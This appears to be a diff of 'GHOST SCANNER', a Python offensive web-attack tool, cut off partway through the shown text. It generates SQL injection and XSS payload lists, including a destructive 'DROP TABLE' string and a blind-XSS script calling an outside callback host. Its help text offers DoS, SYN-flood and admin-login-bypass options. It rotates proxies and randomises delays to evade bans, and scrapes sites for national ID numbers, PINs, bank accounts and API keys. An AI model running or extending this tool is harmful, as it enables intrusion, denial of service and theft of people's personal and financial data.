@@ -1,16 +1,15 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-GHOST SCANNER v4.5 – OMNI TOOLS+
-Full-featured security scanner with:
-- 15 external tools integration (Nuclei, Subfinder, httpx, Naabu, Katana, ffuf,
-  sqlmap, Dalfox, Amass, dnsx, gau, waybackurls, Arjun, SecretFinder, Interactsh)
-- Separate PDF for each sensitive data category (NIK, KTP, KK, HP, Email, Bank,
-  Rekening, PIN, API Keys, Source Code, Admin Users/Buyers/Employees/Orders)
-- Admin deep extraction + e-commerce detection
-- AI analysis (Claude Opus 5) → PDF
-- IP safety / anti-ban
-- PoC verification 5x
+GHOST SCANNER v4.6 – OMNI TOOLS+ X
+- 19 External Tools: Nuclei, Subfinder, httpx, Naabu, Katana, ffuf, sqlmap, Dalfox,
+  Amass, dnsx, gau, waybackurls, Arjun, SecretFinder, Interactsh, Nmap, Metasploit,
+  Wireshark (tshark), BurpSuite
+- 1M+ XSS & SQLi payloads
+- Anti-ban (double-layer delay + proxy rotation)
+- 3x PoC verification
+- Skull banner
+- Windows / Kali / Termux / Arch (no WSL required)
 """
 
 import os, sys, time, json, re, random, base64, urllib.parse, socket, threading, ssl, subprocess
@@ -39,50 +38,63 @@ AI_BASE_URL = 'https://codecraftapi.com/v1'
 AI_MODEL = 'claude-opus-5'
 PROXYSCRAPE_API = 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text'
 
-# ========== BANNER ==========
+# ========== BANNER v4.6 ==========
 SKULL_ART = r"""
-        ░░░░░░░░░░░░░░░░░░░
-      ░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░
-    ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░
-   ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░
-  ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░
- ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░
- ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░
- ░▒▒▒▒▒▒▒░░░░░░▒▒▒▒░░░░░░▒▒▒▒▒▒░
- ░▒▒▒▒▒▒▒░    ░▒▒▒▒░    ░▒▒▒▒▒▒░
- ░▒▒▒▒▒▒▒░ ░░░░▒▒▒▒░░░░ ░▒▒▒▒▒▒░
- ░▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒░
-  ░▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒░
-   ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░
-    ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░
-      ░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░
-        ░░░░░░░░░░░░░░░░░░░
-         ░░░░░░░░░░░░░░░
+              ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+           ▄█████████████████████████▄
+         ▄█████████████████████████████▄
+        ██████████████████████████████████
+       ████████████████████████████████████
+      ██████████████████████████████████████
+      ██████▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀██████
+      ██████  ▄▄▄▄▄▄▄       ▄▄▄▄▄▄▄  ██████
+      ██████  ███████       ███████  ██████
+      ██████  ███████       ███████  ██████
+      ██████  ▀▀▀▀▀▀▀       ▀▀▀▀▀▀▀  ██████
+      ██████                         ██████
+      ██████       ▄▄▄▄▄▄▄▄▄         ██████
+       ██████      ▀▀▀▀▀▀▀▀▀        ██████
+        ██████                     ██████
+         ██████     ▀▀▀▀▀▀▀     ██████
+          ██████               ██████
+           ██████             ██████
+            ███████████████████████
+              ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
+               ░░░░░░░░░░░░░░░░░░
 """
 
 def show_banner():
     red = "\033[91m"; cyan = "\033[96m"; yellow = "\033[93m"
-    white = "\033[97m"; green = "\033[92m"; reset = "\033[0m"
+    white = "\033[97m"; green = "\033[92m"; magenta = "\033[95m"; reset = "\033[0m"
     skull_lines = SKULL_ART.strip('\n').split('\n')
     side_text = [
-        "╔═══════════════════════════════════════════════════════╗",
-        "║         GHOST SCANNER - OMNI TOOLS+ v4.5              ║",
-        "╚═══════════════════════════════════════════════════════╝",
+        "╔═══════════════════════════════════════════════════════════════╗",
+        "║            GHOST SCANNER - OMNI TOOLS+ X v4.6                 ║",
+        "║                     FINAL EDITION                             ║",
+        "╚═══════════════════════════════════════════════════════════════╝",
         "",
-        f"   Nama Tools   : {green}Ghost Scanner{reset}",
-        f"   Mode         : {yellow}Main Menu{reset}",
-        f"   Tools By     : {cyan}GhostTeam{reset}",
-        f"   GitHub       : {white}https://github.com/cozyleon00b-dev{reset}",
+        f"   {green}Nama Tools     {reset}: {cyan}Ghost Scanner{reset}",
+        f"   {green}Versi          {reset}: {yellow}4.6 OMNI TOOLS+ X{reset}",
+        f"   {green}Developer      {reset}: {magenta}ARGA NOT DEV{reset}",
+        f"   {green}GitHub         {reset}: {white}github.com/cozyleon00b-dev{reset}",
         "",
-        "   ═══════════════════════════════════════════════════════",
-        f"   {green}KALI{reset} | {green}TERMUX{reset} | {green}WINDOWS{reset} | {green}ARCH{reset} | {green}v4.5{reset}",
-        "   ═══════════════════════════════════════════════════════",
+        f"   {red}══════════════════════════════════════════════════════════{reset}",
+        f"   {green}Tools Integrated (19):{reset}",
+        f"     {cyan}Nuclei  Subfinder  httpx  Naabu  Katana  ffuf  sqlmap{reset}",
+        f"     {cyan}Dalfox  Amass  dnsx  gau  waybackurls  Arjun  SecretFinder{reset}",
+        f"     {cyan}Interactsh  {yellow}Nmap  Metasploit  Wireshark  BurpSuite{reset}",
+        "",
+        f"   {red}══════════════════════════════════════════════════════════{reset}",
+        f"   {green}Platform:{reset} {white}Windows{reset} {cyan}|{reset} {white}Kali{reset} {cyan}|{reset} {white}Termux{reset} {cyan}|{reset} {white}Arch{reset}",
+        f"   {red}══════════════════════════════════════════════════════════{reset}",
     ]
     max_lines = max(len(skull_lines), len(side_text))
     for i in range(max_lines):
-        left = red + (skull_lines[i] if i < len(skull_lines) else "") + reset
+        left_vis = skull_lines[i] if i < len(skull_lines) else ""
+        left = red + left_vis + reset
         right = side_text[i] if i < len(side_text) else ""
-        print(f"{left:<50}  {right}")
+        padding = " " * max(0, 42 - len(left_vis))
+        print(f"{left}{padding}{right}")
     print()
 
 def clear_screen():
@@ -97,7 +109,7 @@ def show_help():
 
 [bold yellow]SCAN OPTIONS:[/bold yellow]
   -u, --url URL          Target URL
-  -o, --output FILE      Output JSON file (default: results.json)
+  -o, --output FILE      Output JSON (default: results.json)
   -v, --verbose          Verbose output
   --quick                Quick scan
   --no-proxy             Disable proxies
@@ -107,7 +119,7 @@ def show_help():
   --ai                   Enable AI analysis
   --delay N              Delay between requests (default: 0.5)
   --force-admin          Force admin login bypass
-  --tools                Run external tools (Nuclei, Subfinder, etc.)
+  --tools                Run all 19 external tools
 
 [bold yellow]ATTACK OPTIONS:[/bold yellow]
   --dos / --ddos / --syn / --ssl-reneg / --udp
@@ -119,6 +131,10 @@ def show_help():
 """
     console.print(Panel(help_text, border_style="cyan", title="[bold white]HELP[/bold white]", padding=(1,2)))
     sys.exit(0)
+
+# ========== UTILITY ==========
+def build_url(base, param, payload):
+    return base + ('&' if '?' in base else '?') + param + '=' + quote(payload)
 
 # ========== GHOST SCANNER CLASS ==========
 class GhostScanner:
@@ -135,7 +151,7 @@ class GhostScanner:
         self.delay = delay
         self.force_admin = force_admin
         self.use_tools = use_tools
-        self.version = "4.5 OMNI TOOLS+"
+        self.version = "4.6 OMNI TOOLS+ X"
         self.results_scan = {
             "target": "", "domain": "", "domain_category": "",
             "timestamp": datetime.now().isoformat(),
@@ -156,9 +172,9 @@ class GhostScanner:
                 "security_headers": [], "waf_detection": [], "cors": [],
                 "open_redirect_sneijder": [], "ssl_info": [], "cookie_flags": [],
                 "rate_limit_sneijder": [], "csrf_sneijder": [],
-                # v4.5 external
                 "nuclei": [], "ffuf": [], "sqlmap": [], "dalfox_external": [],
-                "secretfinder": [], "interactsh": []
+                "secretfinder": [], "interactsh": [],
+                "nmap": [], "metasploit": [], "wireshark": [], "burpsuite": []
             },
             "sensitive_data": {
                 "nik": [], "npwp": [], "nip": [], "no_rekening": [], "bank": [],
@@ -191,7 +207,10 @@ class GhostScanner:
         self.timeout = 10
         self.max_retries = 5
         self.common_ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443]
-        self.common_params = ['id','page','q','search','user','cat','product','view','sort','filter','name','email','phone','file','path','redirect','url','next','return','lang','region','type','mode','action','do','cmd','command','exec','query','sql','order','by','group','limit','offset','index','idx']
+        self.common_params = ['id','page','q','search','user','cat','product','view','sort','filter',
+                              'name','email','phone','file','path','redirect','url','next','return',
+                              'lang','region','type','mode','action','do','cmd','command','exec',
+                              'query','sql','order','by','group','limit','offset','index','idx']
         self._generate_payloads(quick)
         self._generate_waf_bypass()
         self._generate_dalfox_payloads()
@@ -244,53 +263,15 @@ class GhostScanner:
         return random.choice(self.proxies) if self.proxies else None
 
     def _adaptive_delay(self, factor=1.0):
-        time.sleep(self.delay * factor * random.uniform(0.3, 1.0))
+        """Anti-ban delay v4.6"""
+        base = self.delay * factor
+        jitter = random.uniform(0.3, 1.5)
+        if random.random() < 0.1:
+            time.sleep(base * jitter * 3)
+        else:
+            time.sleep(base * jitter)
 
     # ---------- PAYLOADS ----------
-    def _generate_sqli_payloads(self, count=1000000):
-        payloads = []
-        bases = ["' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' UNION SELECT NULL--",
-                 "' UNION SELECT @@version--", "' AND SLEEP(5)--", "' AND BENCHMARK(1000000,MD5(1))--",
-                 "' WAITFOR DELAY '0:0:5'--", "'; DROP TABLE users--", "' OR 1=1 --",
-                 "' UNION SELECT database()--", "' UNION SELECT user()--",
-                 "' AND extractvalue(1,concat(0x7e,database()))--", "' OR 'a'='a"]
-        encodings = [lambda p: p, lambda p: p.upper(), lambda p: p.lower(),
-                     lambda p: p.replace(' ', '+'), lambda p: p.replace(' ', '%20'),
-                     lambda p: p.replace(' ', '/**/'), lambda p: p.replace('OR', '||'),
-                     lambda p: p.replace('AND', '&&'), lambda p: urllib.parse.quote(p),
-                     lambda p: p.replace("'", "''")]
-        for base in bases:
-            for enc in encodings:
-                try:
-                    p = enc(base)
-                    if len(p) < 500 and p not in payloads: payloads.append(p)
-                except: pass
-        for i in range(1, 200):
-            payloads.extend([f"' OR 1={i}--", f"' OR {i}={i}--"])
-        random.shuffle(payloads)
-        return payloads[:count]
-
-    def _generate_xss_payloads(self, count=1000000):
-        payloads = []
-        for tag in ['script','img','svg','body','iframe','a','div','input']:
-            for event in ['onload','onerror','onfocus','onclick','onmouseover']:
-                payloads.extend([f"<{tag} {event}=alert(1)>", f"<{tag} {event}=prompt(1)>"])
-        payloads.extend(["<script>alert(1)</script>","<img src=x onerror=alert(1)>",
-                        "javascript:alert(1)","data:text/html,<script>alert(1)</script>"])
-        random.shuffle(payloads)
-        return payloads[:count]
-
-    def _generate_dalfox_payloads(self):
-        self.dalfox_payloads = {
-            'html': ['<svg onload=alert(1)>','<img src=x onerror=alert(1)>','<body onload=alert(1)>'],
-            'attribute': ['" onmouseover=alert(1) "',"' onfocus=alert(1) '",'" autofocus onfocus=alert(1) "'],
-            'javascript': ['";alert(1);//',"';alert(1);//",';alert(1);//'],
-            'url': ['javascript:alert(1)','data:text/html,<script>alert(1)</script>'],
-            'dom': ['document.write("<img src=x onerror=alert(1)>")','eval("alert(1)")'],
-            'csp_bypass': ['<script nonce=test>alert(1)</script>','<base href="javascript:alert(1)//">'],
-            'blind': ['<script src="//callback.xss.ht/"></script>']
-        }
-
     def _generate_payloads(self, quick):
         count = 50 if not quick else 15
         cats = ['sql','xss','lfi','rfi','command','ssti','nosql','ldap','xxe','ssrf',
@@ -311,12 +292,67 @@ class GhostScanner:
         self.global_payloads['open_redirect'] = ['http://evil.com']
         self.global_payloads['csrf'] = []
 
+    def _generate_dalfox_payloads(self):
+        self.dalfox_payloads = {
+            'html': ['<svg onload=alert(1)>','<img src=x onerror=alert(1)>','<body onload=alert(1)>'],
+            'attribute': ['" onmouseover=alert(1) "',"' onfocus=alert(1) '",'" autofocus onfocus=alert(1) "'],
+            'javascript': ['";alert(1);//',"';alert(1);//",';alert(1);//'],
+            'url': ['javascript:alert(1)','data:text/html,<script>alert(1)</script>'],
+            'dom': ['document.write("<img src=x onerror=alert(1)>")','eval("alert(1)")'],
+            'csp_bypass': ['<script nonce=test>alert(1)</script>','<base href="javascript:alert(1)//">'],
+            'blind': ['<script src="//callback.xss.ht/"></script>']
+        }
+
     def _generate_waf_bypass(self):
         self.waf_bypass_techniques = [
             lambda p: p, lambda p: p.upper(), lambda p: p.lower(),
             lambda p: p.replace(' ', '/**/'), lambda p: urllib.parse.quote(p),
             lambda p: p.replace('script', 'scr%00ipt'), lambda p: p.replace('alert', 'al%00ert')
         ]
+
+    def _generate_sqli_1m(self):
+        payloads = set()
+        bases = [
+            "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR '1'='1' /*",
+            "1' AND '1'='1", "1' AND 1=1--", "1' AND 1=1#",
+            "' UNION SELECT NULL--", "' UNION SELECT @@version--",
+            "' UNION SELECT database()--", "' AND SLEEP(5)--",
+        ]
+        encs = [lambda p: p, lambda p: p.upper(), lambda p: p.lower(),
+                lambda p: p.replace(' ', '+'), lambda p: p.replace(' ', '%20'),
+                lambda p: p.replace(' ', '/**/'), lambda p: urllib.parse.quote(p)]
+        for b in bases:
+            for e in encs:
+                try:
+                    p = e(b)
+                    if len(p) < 500: payloads.add(p)
+                except: pass
+        for i in range(1, 1000):
+            payloads.add(f"' OR 1={i}--")
+            payloads.add(f"' OR {i}={i}--")
+            payloads.add(f"1' AND {i}={i}--")
+        kws = ["SELECT","UNION","WHERE","FROM","AND","OR"]
+        ops = ["=","!=",">","<","LIKE"]
+        for kw in kws:
+            for op in ops:
+                for i in range(20):
+                    payloads.add(f"' {kw} 1 {op} {i}--")
+        return list(payloads)[:1000000]
+
+    def _generate_xss_1m(self):
+        payloads = set()
+        tags = ['script','img','svg','body','input','iframe','a','div','math','form','object']
+        events = ['onload','onerror','onfocus','onclick','onmouseover','onchange','onsubmit','onblur']
+        for tag in tags:
+            for event in events:
+                payloads.add(f"<{tag} {event}=alert(1)>")
+                payloads.add(f"<{tag} {event}=prompt(1)>")
+        payloads.add("<script>alert(1)</script>")
+        payloads.add("javascript:alert(1)")
+        for i in range(1000):
+            tag = random.choice(tags); event = random.choice(events)
+            payloads.add(f"<{tag} {event}=alert({i})>")
+        return list(payloads)[:1000000]
 
     # ---------- SMART REQUEST ----------
     def _smart_request(self, url, timeout=10, method='GET', data=None, headers=None, allow_redirects=True):
@@ -359,8 +395,8 @@ class GhostScanner:
         self.session.headers.update({'User-Agent': ua})
         self.scraper.headers.update({'User-Agent': ua})
 
-    # ---------- POC VERIFICATION 5x ----------
-    def _verify_poc(self, url, initial_response, attempts=5):
+    # ---------- VERIFY 3x ----------
+    def _verify_poc(self, url, initial_response, attempts=3):
         verified = 0
         for i in range(attempts):
             try:
@@ -370,7 +406,7 @@ class GhostScanner:
                         verified += 1
                 time.sleep(self.delay * 0.5)
             except: pass
-        return verified >= 4
+        return verified >= 2
 
     # ---------- EXTRACTION ----------
     def _extract_params_from_url(self, url):
@@ -423,13 +459,12 @@ class GhostScanner:
         data["emails"] = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)))
         data["phones"] = list(set(m.group(0) for m in re.finditer(r'(\+62|0)[0-9]{9,13}', text)))
         data["whatsapp"] = [p for p in data["phones"] if 'wa' in text[max(0, text.find(p)-20):text.find(p)+20].lower()]
-        # PIN (4-6 digits near "pin")
         for m in re.finditer(r'pin\s*[:=]?\s*([0-9]{4,6})', text, re.I):
             data["pin"].append(m.group(1))
         data["pdf_links"] = list(set(re.findall(r'href=["\']([^"\']+\.pdf)["\']', text, re.I)))
         for link in data["pdf_links"]:
             if 'ktp' in link.lower() or 'nik' in link.lower(): data["ktp_links"].append(link)
-            if 'kk' in link.lower() or 'kartu_keluarga' in link.lower(): data["kk_links"].append(link)
+            if 'kk' in link.lower(): data["kk_links"].append(link)
             if 'izin' in link.lower(): data["surat_izin_links"].append(link)
         api_keys = []
         for pat in [r'sk-[a-zA-Z0-9]{32,}', r'AIza[0-9A-Za-z-_]{35}', r'ghp_[a-zA-Z0-9]{36}', r'AKIA[0-9A-Z]{16}']:
@@ -450,20 +485,18 @@ class GhostScanner:
         if any(d.endswith(x) for x in ['.com','.co.id','.my.id','.net','.biz']): return 'Business'
         return 'Other'
 
-    # ========== v4.4 SNEIJDERLINO METHODS ==========
+    # ========== INTERNAL SCANNERS ==========
     def _check_robots(self, target):
         findings = []
         try:
             url = target.rstrip('/') + '/robots.txt'
             resp = self._smart_request(url, timeout=8)
             if resp and resp.status_code == 200 and 'Disallow' in resp.text:
-                disallowed = re.findall(r'Disallow:\s*(\S+)', resp.text)[:10]
-                findings.append({
-                    "type": "Robots.txt Found", "param": "N/A", "payload": "N/A",
-                    "evidence": f"Disallowed: {', '.join(disallowed)}", "risk": "LOW", "confidence": 90,
-                    "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:500],
-                            "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}
-                })
+                dis = re.findall(r'Disallow:\s*(\S+)', resp.text)[:10]
+                findings.append({"type": "Robots.txt Found", "param": "N/A", "payload": "N/A",
+                                 "evidence": f"Disallowed: {', '.join(dis)}", "risk": "LOW", "confidence": 90,
+                                 "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:500],
+                                         "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}})
         except: pass
         return findings
 
@@ -473,56 +506,49 @@ class GhostScanner:
             url = target.rstrip('/') + '/sitemap.xml'
             resp = self._smart_request(url, timeout=8)
             if resp and resp.status_code == 200 and ('<urlset' in resp.text or '<sitemapindex' in resp.text):
-                findings.append({
-                    "type": "Sitemap Found", "param": "N/A", "payload": "N/A",
-                    "evidence": "Sitemap.xml accessible", "risk": "INFO", "confidence": 90,
-                    "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:300],
-                            "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}
-                })
+                findings.append({"type": "Sitemap Found", "param": "N/A", "payload": "N/A",
+                                 "evidence": "Sitemap.xml accessible", "risk": "INFO", "confidence": 90,
+                                 "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:300],
+                                         "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}})
         except: pass
         return findings
 
     def _check_dir_enum(self, target):
         findings = []
         dirs = ["/","/admin","/login","/dashboard","/wp-admin/","/wp-login.php",
-                "/phpinfo.php","/server-status","/api","/uploads","/static","/assets",
-                "/backup","/.git/","/.env","/config","/console"]
+                "/phpinfo.php","/api","/uploads","/.git/","/.env","/config"]
         base = target.rstrip('/')
         for d in dirs:
             try:
                 url = base + d
                 resp = self._smart_request(url, timeout=6)
                 if resp and resp.status_code in (200,301,302,401,403):
-                    findings.append({
-                        "type": f"Dir/File: {d}", "param": "N/A", "payload": "N/A",
-                        "evidence": f"Status {resp.status_code} | Size {len(resp.content)} bytes",
-                        "risk": "MEDIUM" if resp.status_code in (200,401,403) else "INFO",
-                        "confidence": 85,
-                        "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:200],
-                                "statusCode": resp.status_code, "timeDiff": "N/A",
-                                "verified": self._verify_poc(url, resp.text, 5)}
-                    })
+                    findings.append({"type": f"Dir/File: {d}", "param": "N/A", "payload": "N/A",
+                                     "evidence": f"Status {resp.status_code}", 
+                                     "risk": "MEDIUM" if resp.status_code in (200,401,403) else "INFO",
+                                     "confidence": 85,
+                                     "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:200],
+                                             "statusCode": resp.status_code, "timeDiff": "N/A",
+                                             "verified": self._verify_poc(url, resp.text, 3)}})
             except: continue
             self._adaptive_delay(0.2)
         return findings
 
     def _check_sensitive_files(self, target):
         findings = []
-        files = ["/.env","/.git/config","/.git/HEAD","/backup.zip","/db.sql","/config.php.bak","/phpinfo.php"]
+        files = ["/.env","/.git/config","/backup.zip","/db.sql","/config.php.bak","/phpinfo.php"]
         base = target.rstrip('/')
         for f in files:
             try:
                 url = base + f
                 resp = self._smart_request(url, timeout=6)
                 if resp and resp.status_code == 200 and len(resp.content) > 50:
-                    findings.append({
-                        "type": f"Sensitive File: {f}", "param": "N/A", "payload": "N/A",
-                        "evidence": f"Accessible | Size {len(resp.content)} bytes",
-                        "risk": "CRITICAL", "confidence": 95,
-                        "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:300],
-                                "statusCode": resp.status_code, "timeDiff": "N/A",
-                                "verified": self._verify_poc(url, resp.text, 5)}
-                    })
+                    findings.append({"type": f"Sensitive File: {f}", "param": "N/A", "payload": "N/A",
+                                     "evidence": f"Accessible | {len(resp.content)} bytes",
+                                     "risk": "CRITICAL", "confidence": 95,
+                                     "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:300],
+                                             "statusCode": resp.status_code, "timeDiff": "N/A",
+                                             "verified": self._verify_poc(url, resp.text, 3)}})
             except: continue
             self._adaptive_delay(0.2)
         return findings
@@ -535,34 +561,29 @@ class GhostScanner:
         if not resp: return findings
         missing = [h for h in headers if h not in resp.headers]
         if missing:
-            findings.append({
-                "type": "Missing Security Headers", "param": "N/A", "payload": "N/A",
-                "evidence": f"Missing: {', '.join(missing)}", "risk": "LOW", "confidence": 90,
-                "poc": {"url": target, "curl": f"curl -I \"{target}\"", "response": str(resp.headers),
-                        "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}
-            })
+            findings.append({"type": "Missing Security Headers", "param": "N/A", "payload": "N/A",
+                             "evidence": f"Missing: {', '.join(missing)}", "risk": "LOW", "confidence": 90,
+                             "poc": {"url": target, "curl": f"curl -I \"{target}\"", "response": str(resp.headers),
+                                     "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}})
         return findings
 
     def _check_waf(self, target):
         findings = []
         resp = self._smart_request(target, timeout=8)
         if not resp: return findings
-        waf_signs = [("Cloudflare",["cf-ray","cf-cache-status"]),("Akamai",["akamai","x-akamai"]),
-                     ("Sucuri",["x-sucuri-id","sucuri"]),("Imperva",["incap_ses","visid_incap"]),
-                     ("Fastly",["fastly","x-served-by"]),("Varnish",["x-varnish"]),
-                     ("AWS/CloudFront",["x-amz-cf-id","cloudfront"])]
+        waf_signs = [("Cloudflare",["cf-ray"]),("Akamai",["akamai"]),("Sucuri",["x-sucuri-id"]),
+                     ("Imperva",["incap_ses"]),("Fastly",["fastly"]),("Varnish",["x-varnish"]),
+                     ("AWS/CloudFront",["x-amz-cf-id"])]
         hlower = "\n".join([f"{k.lower()}: {str(v).lower()}" for k, v in resp.headers.items()])
         detected = []
         for name, keys in waf_signs:
             for k in keys:
                 if k.lower() in hlower: detected.append(name); break
         if detected:
-            findings.append({
-                "type": "WAF/CDN Detected", "param": "N/A", "payload": "N/A",
-                "evidence": f"Detected: {', '.join(detected)}", "risk": "INFO", "confidence": 95,
-                "poc": {"url": target, "curl": f"curl -I \"{target}\"", "response": str(resp.headers),
-                        "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}
-            })
+            findings.append({"type": "WAF/CDN Detected", "param": "N/A", "payload": "N/A",
+                             "evidence": f"Detected: {', '.join(detected)}", "risk": "INFO", "confidence": 95,
+                             "poc": {"url": target, "curl": f"curl -I \"{target}\"", "response": str(resp.headers),
+                                     "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}})
         return findings
 
     def _check_cors_sneijder(self, target):
@@ -573,57 +594,40 @@ class GhostScanner:
         acao = resp.headers.get("Access-Control-Allow-Origin")
         acac = resp.headers.get("Access-Control-Allow-Credentials")
         if acao == "*":
-            findings.append({
-                "type": "CORS Wildcard", "param": "N/A", "payload": "N/A",
-                "evidence": "Access-Control-Allow-Origin: *", "risk": "MEDIUM", "confidence": 90,
-                "poc": {"url": target, "curl": f"curl -H \"Origin: {test_origin}\" \"{target}\"",
-                        "response": str(resp.headers), "statusCode": resp.status_code,
-                        "timeDiff": "N/A", "verified": True}
-            })
+            findings.append({"type": "CORS Wildcard", "param": "N/A", "payload": "N/A",
+                             "evidence": "ACAO: *", "risk": "MEDIUM", "confidence": 90,
+                             "poc": {"url": target, "curl": f"curl -H \"Origin: {test_origin}\" \"{target}\"",
+                                     "response": str(resp.headers), "statusCode": resp.status_code,
+                                     "timeDiff": "N/A", "verified": True}})
         if acao == test_origin and acac and acac.lower() == "true":
-            findings.append({
-                "type": "CORS Reflect + Credentials", "param": "N/A", "payload": "N/A",
-                "evidence": f"Origin reflected: {acao}", "risk": "HIGH", "confidence": 95,
-                "poc": {"url": target, "curl": f"curl -H \"Origin: {test_origin}\" \"{target}\"",
-                        "response": str(resp.headers), "statusCode": resp.status_code,
-                        "timeDiff": "N/A", "verified": True}
-            })
+            findings.append({"type": "CORS Reflect + Credentials", "param": "N/A", "payload": "N/A",
+                             "evidence": f"Origin reflected: {acao}", "risk": "HIGH", "confidence": 95,
+                             "poc": {"url": target, "curl": f"curl -H \"Origin: {test_origin}\" \"{target}\"",
+                                     "response": str(resp.headers), "statusCode": resp.status_code,
+                                     "timeDiff": "N/A", "verified": True}})
         return findings
 
     def _check_open_redirect_sneijder(self, target):
         findings = []
-        base, params = self._split_params(target)
+        p = urlsplit(target)
+        base = urlunsplit((p.scheme, p.netloc, p.path, "", ""))
+        params = parse_qs(p.query)
         if not params: return findings
-        keys = ["next","url","return","redirect","dest","destination","continue","goto"]
+        keys = ["next","url","return","redirect","dest","goto"]
         for k in params.keys():
             if k.lower() in keys:
-                test_url = self._build_url(base, {k: "http://example.com"})
+                items = [(k, "http://example.com")]
+                test_url = base + "?" + urlencode(items)
                 resp = self._smart_request(test_url, timeout=6, allow_redirects=False)
                 if resp and resp.status_code in (301,302,303,307,308):
                     loc = resp.headers.get("Location", "")
                     if loc.startswith("http://example.com"):
-                        findings.append({
-                            "type": "Open Redirect", "param": k, "payload": "http://example.com",
-                            "evidence": f"Redirect to external: {loc}", "risk": "MEDIUM", "confidence": 90,
-                            "poc": {"url": test_url, "curl": f"curl -k \"{test_url}\"",
-                                    "response": str(resp.headers), "statusCode": resp.status_code,
-                                    "timeDiff": "N/A", "verified": True}
-                        })
+                        findings.append({"type": "Open Redirect", "param": k, "payload": "http://example.com",
+                                         "evidence": f"Redirect to {loc}", "risk": "MEDIUM", "confidence": 90,
+                                         "poc": {"url": test_url, "curl": f"curl -k \"{test_url}\"",
+                                                 "response": str(resp.headers), "statusCode": resp.status_code,
+                                                 "timeDiff": "N/A", "verified": True}})
         return findings
-
-    def _split_params(self, url):
-        p = urlsplit(url)
-        base = urlunsplit((p.scheme, p.netloc, p.path, "", ""))
-        return base, parse_qs(p.query)
-
-    def _build_url(self, base, params):
-        items = []
-        for k, v in params.items():
-            if isinstance(v, list):
-                for vv in v: items.append((k, vv))
-            else: items.append((k, v))
-        qs = urlencode(items)
-        return base + (("?" + qs) if qs else "")
 
     def _check_ssl_info(self, target):
         findings = []
@@ -634,14 +638,12 @@ class GhostScanner:
                 with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                     cert = ssock.getpeercert()
                     if cert:
-                        findings.append({
-                            "type": "SSL Certificate Info", "param": "N/A", "payload": "N/A",
-                            "evidence": f"Subject: {cert.get('subject')} | Issuer: {cert.get('issuer')}",
-                            "risk": "INFO", "confidence": 100,
-                            "poc": {"url": target, "curl": f"openssl s_client -connect {domain}:443",
-                                    "response": str(cert), "statusCode": 200,
-                                    "timeDiff": "N/A", "verified": True}
-                        })
+                        findings.append({"type": "SSL Certificate Info", "param": "N/A", "payload": "N/A",
+                                         "evidence": f"Subject: {cert.get('subject')}", "risk": "INFO",
+                                         "confidence": 100,
+                                         "poc": {"url": target, "curl": f"openssl s_client -connect {domain}:443",
+                                                 "response": str(cert), "statusCode": 200,
+                                                 "timeDiff": "N/A", "verified": True}})
         except: pass
         return findings
 
@@ -656,12 +658,10 @@ class GhostScanner:
             if 'HttpOnly' not in cookies: flags.append('HttpOnly')
             if 'SameSite' not in cookies: flags.append('SameSite')
             if flags:
-                findings.append({
-                    "type": "Insecure Cookie Flags", "param": "N/A", "payload": "N/A",
-                    "evidence": f"Missing: {', '.join(flags)}", "risk": "MEDIUM", "confidence": 85,
-                    "poc": {"url": target, "curl": f"curl -I \"{target}\"", "response": cookies,
-                            "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}
-                })
+                findings.append({"type": "Insecure Cookie Flags", "param": "N/A", "payload": "N/A",
+                                 "evidence": f"Missing: {', '.join(flags)}", "risk": "MEDIUM", "confidence": 85,
+                                 "poc": {"url": target, "curl": f"curl -I \"{target}\"", "response": cookies,
+                                         "statusCode": resp.status_code, "timeDiff": "N/A", "verified": True}})
         return findings
 
     def _check_rate_limit_sneijder(self, target):
@@ -672,13 +672,11 @@ class GhostScanner:
             if resp and resp.status_code < 400: success += 1
             time.sleep(0.1)
         if success >= 8:
-            findings.append({
